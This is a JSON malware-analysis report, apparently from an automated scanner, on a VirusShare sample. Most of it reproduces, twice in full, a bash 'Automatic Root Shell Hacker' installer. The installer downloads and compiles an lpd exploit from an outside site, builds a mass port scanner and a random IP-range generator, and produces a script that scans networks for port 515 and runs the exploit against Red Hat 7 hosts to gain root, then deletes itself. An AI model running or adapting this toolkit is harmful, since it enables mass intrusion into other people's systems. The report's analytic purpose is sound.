{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/bin/bash\n\necho \"\"\necho \"[ElectronicSouls] Arsh3 installer\";\necho \"\"\n\nlynx -dump http://www.securityfocus.com/data/vulnerabilities/exploits/SEClpd.c>seclpd.c;\n\nif [ -e seclpd.c ]\n then\n  echo [*] seclpd.c downloaded\n else\n  echo [ ] seclpd counld not be downloaded...exiting;exit 1\nfi\n\ngcc seclpd.c -o seclpd\nrm -f seclpd.c;\n\nif [ -e seclpd ]\n then\n  echo [*] seclpd compiled\n else\n  echo [ ] seclpd counld not be compiled...exiting;exit 1\nfi\n\ncat >randb.c <<EOF\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\nint a=0,b=0;\nsrand(time(NULL));\nstart:;\na=1+(int) (223.0*rand()/(RAND_MAX+1.0));\nb=1+(int) (255.0*rand()/(RAND_MAX+1.0));\nif (a == 127) { goto start; }\nif (a == 0) { goto start; }\nif (a == 1) { goto start; }\nif (a == 2) { goto start; }\nif (a == 3) { goto start; }\nif (a == 4) { goto start; }\nif (a == 5) { goto start; }\nif (a == 6) { goto start; }\nif (a == 7) { goto start; }\nif (a == 8) { goto start; }\nif (a == 9) { goto start; }\nif (a == 10) { goto start; }\nif (a == 49) { goto start; }\nif (a == 192) { if (b == 168) { goto start; } }\nprintf(\"%i.%i\", a, b);\n}\nEOF\n\n\nif [ ! -e randb.c ]\n then\n  echo [ ] Cannot create. Exiting.;exit 1\n else\n  echo [*] randb.c created\nfi\n\ngcc randb.c -o randb\nrm -f randb.c\n\nif [ ! -e randb ]\n then\n  echo [ ] Cannot compile. Exiting.;exit 1\n else\n  echo [*] randb.c compiled\nfi\n\n\ncat > pscan.c <<EOF\n#include <stdio.h>\n#include <string.h>\n#include <time.h>\n#include <fcntl.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <errno.h>\n\n#define MAX_SOCKETS 200\n#define TIMEOUT 3\n\n#define S_NONE       0\n#define S_CONNECTING 1\n\nstruct conn_t {\n  int s;\n  char status;\n  time_t a;\n  struct sockaddr_in addr;\n};\nstruct conn_t connlist[MAX_SOCKETS];\n\nvoid init_sockets(void);\nvoid check_sockets(void);\nvoid cheq_ftp(char *);\nvoid fatal(char *);\n\nint main(int argc, char *argv[])\n{\n  int done, i, cip, bb, ret, k, ns;\n  time_t scantime;\n  char ip[20];\n\n  if (argc < 3) {\n     printf(\"Usage: %s <b-block> <port> [c-block]\\n\", argv[0]);\n     return -1;\n  }\n\n  done = 0; cip = 1; bb = 0;\n\n  if (argc >= 4) {\n     bb = atoi(argv[3]);\n     if ((bb < 0) || (bb > 255))\n        fatal(\"Invalid b-range.\\n\");\n  }\n\n  init_sockets();\n\n  scantime = time(0);\n\n  while(!done) {\n    for (i = 0; i < MAX_SOCKETS; i++) {\n        if (cip == 255) {           \n           if ((bb == 255) || (argc >= 4)) {\n              ns = 0;\n              for (k = 0; k < MAX_SOCKETS; k++) {               \n                  if (connlist[k].status > S_NONE) {\n                     ns++;\n                     break;\n                  }\n              }\n\n              if (ns == 0)\n                 done = 1;\n\n              break;\n           }\n           else {\n             cip = 0;\n             bb++;\n           }\n        }\n\n        if (connlist[i].status == S_NONE) {\n           connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);\n           if (connlist[i].s == -1)\n              printf(\"Unable to allocate socket.\\n\");\n           else {\n             ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);\n             if (ret == -1) {\n                printf(\"Unable to set O_NONBLOCK\\n\");\n                close(connlist[i].s);\n             }\n             else {\n               memset((char *)ip, 0, 20);\n               sprintf(ip, \"%s.%d.%d\", argv[1], bb, cip);\n               connlist[i].addr.sin_addr.s_addr = inet_addr(ip);\n               if (connlist[i].addr.sin_addr.s_addr == -1)\n                 fatal(\"Invalid IP.\");\n               connlist[i].addr.sin_family = AF_INET;\n               connlist[i].addr.sin_port = htons(atoi(argv[2]));\n               connlist[i].a = time(0);\n               connlist[i].status = S_CONNECTING;\n               cip++;\n             }\n           }\n        }\n    }\n\n    check_sockets();\n  }\n\n  printf(\"\\nScan completed in %u seconds.\\n\", (time(0) - scantime));\n}\n\nvoid init_sockets(void)\n{\n  int i;\n\n  for (i = 0; i < MAX_SOCKETS; i++) {\n      connlist[i].status = S_NONE;\n      memset((struct sockaddr_in *)&connlist[i].addr, 0, \n             sizeof(struct sockaddr_in));\n  }\n}\n\nvoid check_sockets(void)\n{\n  int i, ret;\n\n  for (i = 0; i < MAX_SOCKETS; i++) {\n      if ((connlist[i].a < (time(0) - TIMEOUT)) &&\n          (connlist[i].status == S_CONNECTING)) {\n         close(connlist[i].s);\n         connlist[i].status = S_NONE;\n      }\n\n      else if (connlist[i].status == S_CONNECTING) {\n         ret = connect(connlist[i].s,\n                       (struct sockaddr *)&connlist[i].addr,\n                       sizeof(struct sockaddr_in));\n         if (ret == -1) {\n            if (errno == EISCONN) {\n               printf(\"%s\\n\",\n                      (char *)inet_ntoa(connlist[i].addr.sin_addr));\n               cheq_ftp((char *)inet_ntoa(connlist[i].addr.sin_addr));\n\t       close(connlist[i].s);\n               connlist[i].status = S_NONE;\n            }\n\n            if ((errno != EALREADY) && (errno != EINPROGRESS)) {\n               close(connlist[i].s);\n               connlist[i].status = S_NONE;\n            }\n         }\n         else {\n           printf(\"%s\\n\",\n                  (char *)inet_ntoa(connlist[i].addr.sin_addr));\n\tcheq_ftp((char *)inet_ntoa(connlist[i].addr.sin_addr));\n           close(connlist[i].s);\n           connlist[i].status = S_NONE;\n         }\n      }\n  }\n}\n\nvoid fatal(char *err)\n{\n  int i;\n  printf(\"Error: %s\\n\", err);\n  for (i = 0; i < MAX_SOCKETS; i++) {\n      if (connlist[i].status >= S_CONNECTING)\n         close(connlist[i].s);\n  }\n  exit(-1);\n}\n\nvoid cheq_ftp(char *h) {\n\tchar hay[1024];\n\tsnprintf(hay,sizeof(hay),\"echo %s>>log\",h);\n\tsystem(hay);\n}\nEOF\n\nif [ ! -e pscan.c ]\n then\n  echo \"[ ] Cannot create. Exiting.\";exit 1\n else\n  echo [*] pscan.c created\nfi\n\ngcc pscan.c -o pscan\nrm -f pscan.c\n\nif [ ! -e pscan ]\n then\n  echo \"[ ] Cannot compile. Exiting.\";exit 1\n else\n  echo [*] pscan.c compiled\nfi\n\ncat >arsh3 <<EOF\n#!/bin/bash\nclear\necho \"[ElectronicSouls]\"\necho \"Automatic Root Shell Hacker v3\"\necho \"\"\n\nif [ \"\\$1\" = \"\" ]\n then echo \"\\$0 <B-class> [C-class]\"\n  exit 1\nfi\n\nrm -f perf\necho \"Scanning for lpd\"\n./pscan \\$1 515 \\$2\n\necho \"Scan for lpd ready, filtering out the rh7 boxes\"\ncat log | while read line\n do\n  echo ./chk $line>>perf;\n done\n\nsh perf\nrm -f perf\n\necho \"Ready...trying to own the boxes\"\ncat rh7 | while read line\n do\n  echo \"./seclpd $line brute -t 0 <cmd\">>perf\n done\n\nsh perf\nEOF\n\nif [ ! -e arsh3 ]\n then\n  echo \"[ ] Cannot create arsh3. Exiting.\";exit 1\n else\n  echo [*] arsh3 created\n  chmod +x arsh3\nfi\n\nif [ -e chk ]\nthen\n echo \"[*] chk\"\n chmod +x chk\nelse\n echo \"[ ] chk mising! You need to paste the file chk and chmod +x it!\"\nfi\n\nif [ ! -e cmd ]\nthen\n echo \"[ ] cmd missing! You need to create it and change the password/email!\"\nelse\n echo \"[*] cmd ok\"\n echo \"    Edit cmd and change line 9 (mail) and line 25 (password)!\"\nfi\n\nif [ -e rscan ]\nthen\n echo \"[*] rscan\"\n chmod +x rscan\nelse\n echo \"[ ] rscan missing! You need to paste the file rscan and chmod +x it if you want random scans!\"\nfi\n\necho \"\"\n\necho \"\"\nrm -f $0\n"
    },
    "filename": "VirusShare_21d6f696e38e3534c58c522f39336ea4",
    "filesize": 7312,
    "filetype": "Bourne-Again shell script, ASCII text executable, with CRLF line terminators",
    "hashes": {
        "md5": "21d6f696e38e3534c58c522f39336ea4",
        "sha1": "abf7a6c4d4fd47203043dbfb1b8fcf2dc1bb3eaa",
        "sha256": "dfb40f8dbe375fce69d4216580ed394bdc3314920625520b5d9250d4295151bc"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/bin/bash",
            "echo \"\"",
            "echo \"[ElectronicSouls] Arsh3 installer\";",
            "echo \"\"",
            "lynx -dump http://www.securityfocus.com/data/vulnerabilities/exploits/SEClpd.c>seclpd.c;",
            "if [ -e seclpd.c ]",
            " then",
            "  echo [*] seclpd.c downloaded",
            " else",
            "  echo [ ] seclpd counld not be downloaded...exiting;exit 1",
            "gcc seclpd.c -o seclpd",
            "rm -f seclpd.c;",
            "if [ -e seclpd ]",
            " then",
            "  echo [*] seclpd compiled",
            " else",
            "  echo [ ] seclpd counld not be compiled...exiting;exit 1",
            "cat >randb.c <<EOF",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "int main() {",
            "int a=0,b=0;",
            "srand(time(NULL));",
            "start:;",
            "a=1+(int) (223.0*rand()/(RAND_MAX+1.0));",
            "b=1+(int) (255.0*rand()/(RAND_MAX+1.0));",
            "if (a == 127) { goto start; }",
            "if (a == 0) { goto start; }",
            "if (a == 1) { goto start; }",
            "if (a == 2) { goto start; }",
            "if (a == 3) { goto start; }",
            "if (a == 4) { goto start; }",
            "if (a == 5) { goto start; }",
            "if (a == 6) { goto start; }",
            "if (a == 7) { goto start; }",
            "if (a == 8) { goto start; }",
            "if (a == 9) { goto start; }",
            "if (a == 10) { goto start; }",
            "if (a == 49) { goto start; }",
            "if (a == 192) { if (b == 168) { goto start; } }",
            "printf(\"%i.%i\", a, b);",
            "if [ ! -e randb.c ]",
            " then",
            "  echo [ ] Cannot create. Exiting.;exit 1",
            " else",
            "  echo [*] randb.c created",
            "gcc randb.c -o randb",
            "rm -f randb.c",
            "if [ ! -e randb ]",
            " then",
            "  echo [ ] Cannot compile. Exiting.;exit 1",
            " else",
            "  echo [*] randb.c compiled",
            "cat > pscan.c <<EOF",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <time.h>",
            "#include <fcntl.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <errno.h>",
            "#define MAX_SOCKETS 200",
            "#define TIMEOUT 3",
            "#define S_NONE       0",
            "#define S_CONNECTING 1",
            "struct conn_t {",
            "  int s;",
            "  char status;",
            "  time_t a;",
            "  struct sockaddr_in addr;",
            "struct conn_t connlist[MAX_SOCKETS];",
            "void init_sockets(void);",
            "void check_sockets(void);",
            "void cheq_ftp(char *);",
            "void fatal(char *);",
            "int main(int argc, char *argv[])",
            "  int done, i, cip, bb, ret, k, ns;",
            "  time_t scantime;",
            "  char ip[20];",
            "  if (argc < 3) {",
            "     printf(\"Usage: %s <b-block> <port> [c-block]\\n\", argv[0]);",
            "     return -1;",
            "  done = 0; cip = 1; bb = 0;",
            "  if (argc >= 4) {",
            "     bb = atoi(argv[3]);",
            "     if ((bb < 0) || (bb > 255))",
            "        fatal(\"Invalid b-range.\\n\");",
            "  init_sockets();",
            "  scantime = time(0);",
            "  while(!done) {",
            "    for (i = 0; i < MAX_SOCKETS; i++) {",
            "        if (cip == 255) {           ",
            "           if ((bb == 255) || (argc >= 4)) {",
            "              ns = 0;",
            "              for (k = 0; k < MAX_SOCKETS; k++) {               ",
            "                  if (connlist[k].status > S_NONE) {",
            "                     ns++;",
            "                     break;",
            "                  }",
            "              }",
            "              if (ns == 0)",
            "                 done = 1;",
            "              break;",
            "           }",
            "           else {",
            "             cip = 0;",
            "             bb++;",
            "           }",
            "        }",
            "        if (connlist[i].status == S_NONE) {",
            "           connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);",
            "           if (connlist[i].s == -1)",
            "              printf(\"Unable to allocate socket.\\n\");",
            "           else {",
            "             ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);",
            "             if (ret == -1) {",
            "                printf(\"Unable to set O_NONBLOCK\\n\");",
            "                close(connlist[i].s);",
            "             }",
            "             else {",
            "               memset((char *)ip, 0, 20);",
            "               sprintf(ip, \"%s.%d.%d\", argv[1], bb, cip);",
            "               connlist[i].addr.sin_addr.s_addr = inet_addr(ip);",
            "               if (connlist[i].addr.sin_addr.s_addr == -1)",
            "                 fatal(\"Invalid IP.\");",
            "               connlist[i].addr.sin_family = AF_INET;",
            "               connlist[i].addr.sin_port = htons(atoi(argv[2]));",
            "               connlist[i].a = time(0);",
            "               connlist[i].status = S_CONNECTING;",
            "               cip++;",
            "             }",
            "           }",
            "        }",
            "    }",
            "    check_sockets();",
            "  printf(\"\\nScan completed in %u seconds.\\n\", (time(0) - scantime));",
            "void init_sockets(void)",
            "  int i;",
            "  for (i = 0; i < MAX_SOCKETS; i++) {",
            "      connlist[i].status = S_NONE;",
            "      memset((struct sockaddr_in *)&connlist[i].addr, 0, ",
            "             sizeof(struct sockaddr_in));",
            "void check_sockets(void)",
            "  int i, ret;",
            "  for (i = 0; i < MAX_SOCKETS; i++) {",
            "      if ((connlist[i].a < (time(0) - TIMEOUT)) &&",
            "          (connlist[i].status == S_CONNECTING)) {",
            "         close(connlist[i].s);",
            "         connlist[i].status = S_NONE;",
            "      }",
            "      else if (connlist[i].status == S_CONNECTING) {",
            "         ret = connect(connlist[i].s,",
            "                       (struct sockaddr *)&connlist[i].addr,",
            "                       sizeof(struct sockaddr_in));",
            "         if (ret == -1) {",
            "            if (errno == EISCONN) {",
            "               printf(\"%s\\n\",",
            "                      (char *)inet_ntoa(connlist[i].addr.sin_addr));",
            "               cheq_ftp((char *)inet_ntoa(connlist[i].addr.sin_addr));",
            "\t       close(connlist[i].s);",
            "               connlist[i].status = S_NONE;",
            "            }",
            "            if ((errno != EALREADY) && (errno != EINPROGRESS)) {",
            "               close(connlist[i].s);",
            "               connlist[i].status = S_NONE;",
            "            }",
            "         }",
            "         else {",
            "           printf(\"%s\\n\",",
            "                  (char *)inet_ntoa(connlist[i].addr.sin_addr));",
            "\tcheq_ftp((char *)inet_ntoa(connlist[i].addr.sin_addr));",
            "           close(connlist[i].s);",
            "           connlist[i].status = S_NONE;",
            "         }",
            "      }",
            "void fatal(char *err)",
            "  int i;",
            "  printf(\"Error: %s\\n\", err);",
            "  for (i = 0; i < MAX_SOCKETS; i++) {",
            "      if (connlist[i].status >= S_CONNECTING)",
            "         close(connlist[i].s);",
            "  exit(-1);",
            "void cheq_ftp(char *h) {",
            "\tchar hay[1024];",
            "\tsnprintf(hay,sizeof(hay),\"echo %s>>log\",h);",
            "\tsystem(hay);",
            "if [ ! -e pscan.c ]",
            " then",
            "  echo \"[ ] Cannot create. Exiting.\";exit 1",
            " else",
            "  echo [*] pscan.c created",
            "gcc pscan.c -o pscan",
            "rm -f pscan.c",
            "if [ ! -e pscan ]",
            " then",
            "  echo \"[ ] Cannot compile. Exiting.\";exit 1",
            " else",
            "  echo [*] pscan.c compiled",
            "cat >arsh3 <<EOF",
            "#!/bin/bash",
            "clear",
            "echo \"[ElectronicSouls]\"",
            "echo \"Automatic Root Shell Hacker v3\"",
            "echo \"\"",
            "if [ \"\\$1\" = \"\" ]",
            " then echo \"\\$0 <B-class> [C-class]\"",
            "  exit 1",
            "rm -f perf",
            "echo \"Scanning for lpd\"",
            "./pscan \\$1 515 \\$2",
            "echo \"Scan for lpd ready, filtering out the rh7 boxes\"",
            "cat log | while read line",
            "  echo ./chk $line>>perf;",
            " done",
            "sh perf",
            "rm -f perf",
            "echo \"Ready...trying to own the boxes\"",
            "cat rh7 | while read line",
            "  echo \"./seclpd $line brute -t 0 <cmd\">>perf",
            " done",
            "sh perf",
            "if [ ! -e arsh3 ]",
            " then",
            "  echo \"[ ] Cannot create arsh3. Exiting.\";exit 1",
            " else",
            "  echo [*] arsh3 created",
            "  chmod +x arsh3",
            "if [ -e chk ]",
            "then",
            " echo \"[*] chk\"",
            " chmod +x chk",
            "else",
            " echo \"[ ] chk mising! You need to paste the file chk and chmod +x it!\"",
            "if [ ! -e cmd ]",
            "then",
            " echo \"[ ] cmd missing! You need to create it and change the password/email!\"",
            "else",
            " echo \"[*] cmd ok\"",
            " echo \"    Edit cmd and change line 9 (mail) and line 25 (password)!\"",
            "if [ -e rscan ]",
            "then",
            " echo \"[*] rscan\"",
            " chmod +x rscan",
            "else",
            " echo \"[ ] rscan missing! You need to paste the file rscan and chmod +x it if you want random scans!\"",
            "echo \"\"",
            "echo \"\"",
            "rm -f $0"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.securityfocus.com/data/vulnerabilities/exploits/SEClpd.c"
        ]
    },
    "time": "0:00:00.297663",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
